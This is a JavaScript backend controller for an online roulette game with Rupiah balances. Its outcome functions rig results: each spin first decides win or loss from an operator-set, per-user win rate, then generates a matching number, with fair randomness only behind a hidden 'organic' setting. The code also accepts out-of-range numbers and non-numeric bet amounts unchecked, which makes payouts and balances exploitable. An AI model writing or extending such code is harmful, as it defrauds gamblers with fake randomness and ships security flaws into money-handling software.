const { User, GameHistory, GameSettings } = require('../models');

// Roulette wheel configuration
const ROULETTE_NUMBERS = {
    0: 'green',
    1: 'red', 2: 'black', 3: 'red', 4: 'black', 5: 'red', 6: 'black',
    7: 'red', 8: 'black', 9: 'red', 10: 'black', 11: 'black', 12: 'red',
    13: 'black', 14: 'red', 15: 'black', 16: 'red', 17: 'black', 18: 'red',
    19: 'red', 20: 'black', 21: 'red', 22: 'black', 23: 'red', 24: 'black',
    25: 'red', 26: 'black', 27: 'red', 28: 'black', 29: 'black', 30: 'red',
    31: 'black', 32: 'red', 33: 'black', 34: 'red', 35: 'black', 36: 'red'
};

// Get user win rate (custom or default)
const getUserWinRate = async (user) => {
    if (!user) {
        return 45.0;
    }

    // If user has custom win rate for roulette, use it
    if (user.rouletteWinRate !== null && user.rouletteWinRate !== undefined) {
        return parseFloat(user.rouletteWinRate);
    }

    // Backward compatibility: use generic win rate if set
    if (user.winRate !== null && user.winRate !== undefined) {
        return parseFloat(user.winRate);
    }

    // Otherwise, use roulette win rate from settings
    const rouletteSetting = await GameSettings.findOne({
        where: { settingKey: 'roulette_win_rate' }
    });

    if (rouletteSetting) {
        return parseFloat(rouletteSetting.settingValue);
    }

    const defaultSetting = await GameSettings.findOne({
        where: { settingKey: 'default_win_rate' }
    });

    return defaultSetting ? parseFloat(defaultSetting.settingValue) : 45.0;
};

const isRouletteOrganic = async (user) => {
    if (user && user.rouletteUseOrganic !== null && user.rouletteUseOrganic !== undefined) {
        return user.rouletteUseOrganic;
    }

    const setting = await GameSettings.findOne({
        where: { settingKey: 'roulette_use_organic' }
    });

    return setting ? setting.settingValue === 'true' : false;
};

// Calculate if bet wins based on win rate manipulation
const shouldWin = async (user) => {
    const winRate = await getUserWinRate(user);
    const randomValue = Math.random() * 100;

    // If random value is less than win rate, manipulate to win
    return randomValue < winRate;
};

// Generate result based on win manipulation
const generateResult = async (user, betType, betValue) => {
    const shouldPlayerWin = await shouldWin(user);

    if (shouldPlayerWin) {
        // Generate winning number
        return generateWinningNumber(betType, betValue);
    } else {
        // Generate losing number
        return generateLosingNumber(betType, betValue);
    }
};

// Generate a number that wins the bet
const generateWinningNumber = (betType, betValue) => {
    const numbers = Object.keys(ROULETTE_NUMBERS).map(Number);

    switch (betType) {
        case 'number':
            return parseInt(betValue);

        case 'red':
            const reds = numbers.filter(n => ROULETTE_NUMBERS[n] === 'red');
            return reds[Math.floor(Math.random() * reds.length)];

        case 'black':
            const blacks = numbers.filter(n => ROULETTE_NUMBERS[n] === 'black');
            return blacks[Math.floor(Math.random() * blacks.length)];

        case 'odd':
            const odds = numbers.filter(n => n !== 0 && n % 2 === 1);
            return odds[Math.floor(Math.random() * odds.length)];

        case 'even':
            const evens = numbers.filter(n => n !== 0 && n % 2 === 0);
            return evens[Math.floor(Math.random() * evens.length)];

        default:
            return Math.floor(Math.random() * 37);
    }
};

// Generate a number that loses the bet
const generateLosingNumber = (betType, betValue) => {
    const numbers = Object.keys(ROULETTE_NUMBERS).map(Number);

    switch (betType) {
        case 'number':
            const notNumber = numbers.filter(n => n !== parseInt(betValue));
            return notNumber[Math.floor(Math.random() * notNumber.length)];

        case 'red':
            const notRed = numbers.filter(n => ROULETTE_NUMBERS[n] !== 'red');
            return notRed[Math.floor(Math.random() * notRed.length)];

        case 'black':
            const notBlack = numbers.filter(n => ROULETTE_NUMBERS[n] !== 'black');
            return notBlack[Math.floor(Math.random() * notBlack.length)];

        case 'odd':
            const notOdd = numbers.filter(n => n === 0 || n % 2 === 0);
            return notOdd[Math.floor(Math.random() * notOdd.length)];

        case 'even':
            const notEven = numbers.filter(n => n === 0 || n % 2 === 1);
            return notEven[Math.floor(Math.random() * notEven.length)];

        default:
            return Math.floor(Math.random() * 37);
    }
};

// Calculate winnings based on bet type
const calculateWinnings = (betAmount, betType) => {
    const multipliers = {
        'number': 35,  // Straight up bet pays 35:1
        'red': 1,      // Even money bet
        'black': 1,    // Even money bet
        'odd': 1,      // Even money bet
        'even': 1      // Even money bet
    };

    return parseFloat(betAmount) * (multipliers[betType] || 1);
};

const spin = async (req, res) => {
    try {
        const { betAmount, betType, betValue } = req.body;
        const userId = req.user.id;

        // Validate bet amount
        if (!betAmount || betAmount <= 0) {
            return res.status(400).json({ message: 'Invalid bet amount' });
        }

        // Get user
        const user = await User.findByPk(userId);
        if (!user) {
            return res.status(404).json({ message: 'User not found' });
        }

        const betAmountNumber = parseFloat(betAmount);
        const currentBalance = parseFloat(user.balance);

        // Check balance
        if (currentBalance < betAmountNumber) {
            return res.status(400).json({
                message: `Saldo tidak cukup. Saldo Anda: Rp ${parseFloat(user.balance).toLocaleString('id-ID')}`,
                balance: user.balance,
                required: betAmount
            });
        }

        const useOrganic = await isRouletteOrganic(user);
        const result = useOrganic
            ? Math.floor(Math.random() * 37)
            : await generateResult(user, betType, betValue);
        const resultColor = ROULETTE_NUMBERS[result];

        // Check if bet wins
        let isWin = false;
        switch (betType) {
            case 'number':
                isWin = result === parseInt(betValue);
                break;
            case 'red':
                isWin = resultColor === 'red';
                break;
            case 'black':
                isWin = resultColor === 'black';
                break;
            case 'odd':
                isWin = result !== 0 && result % 2 === 1;
                break;
            case 'even':
                isWin = result !== 0 && result % 2 === 0;
                break;
        }

        // Calculate winnings (winAmount is profit)
        let winAmount = 0;
        let newBalance = currentBalance - betAmountNumber;
        if (isWin) {
            winAmount = calculateWinnings(betAmountNumber, betType);
            newBalance = currentBalance + winAmount;
        }

        // Update user balance
        await user.update({ balance: newBalance });

        // Record game history
        const gameRecord = await GameHistory.create({
            userId,
            betAmount: betAmountNumber,
            betType,
            betValue: betValue?.toString() || null,
            result,
            resultColor,
            isWin,
            winAmount,
            balanceAfter: newBalance
        });

        res.json({
            message: isWin ? 'Congratulations! You won!' : 'Better luck next time!',
            result,
            resultColor,
            isWin,
            winAmount,
            balance: newBalance,
            gameId: gameRecord.id
        });
    } catch (error) {
        console.error('Spin error:', error);
        res.status(500).json({ message: 'Spin failed', error: error.message });
    }
};

const getHistory = async (req, res) => {
    try {
        const userId = req.user.id;
        const limit = parseInt(req.query.limit) || 20;

        const history = await GameHistory.findAll({
            where: { userId },
            order: [['createdAt', 'DESC']],
            limit
        });

        res.json({ history });
    } catch (error) {
        console.error('Get history error:', error);
        res.status(500).json({ message: 'Failed to get history', error: error.message });
    }
};

const getBalance = async (req, res) => {
    try {
        const user = await User.findByPk(req.user.id, {
            attributes: ['balance']
        });

        res.json({ balance: user.balance });
    } catch (error) {
        console.error('Get balance error:', error);
        res.status(500).json({ message: 'Failed to get balance', error: error.message });
    }
};

module.exports = { spin, getHistory, getBalance };
